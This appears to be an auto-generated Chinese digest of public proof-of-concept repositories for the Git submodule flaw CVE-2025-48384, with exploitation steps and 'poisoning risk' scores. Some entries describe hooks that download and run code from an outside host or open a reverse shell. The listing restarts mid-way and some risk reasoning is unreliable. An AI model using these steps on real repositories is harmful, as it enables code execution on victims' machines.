4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
提供的POC代码是有效的，因为它展示了如何创建一个触发漏洞的`post-checkout` hook脚本。尽管脚本本身的功能很简单，但可以替换为任何恶意代码。

**投毒风险：**
该仓库中存在作者隐藏的投毒代码的风险较低，估计为10%。当前提供的脚本只是一个简单的测试脚本，用于验证漏洞的存在。但是，攻击者可能会在更复杂的仓库中隐藏更高级的恶意代码，使其更难被检测到。该风险评估基于提供的信息，实际风险可能因仓库的具体内容而有所不同。

**项目地址:** [admin-ping/CVE-2025-48384-RCE](https://github.com/admin-ping/CVE-2025-48384-RCE)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
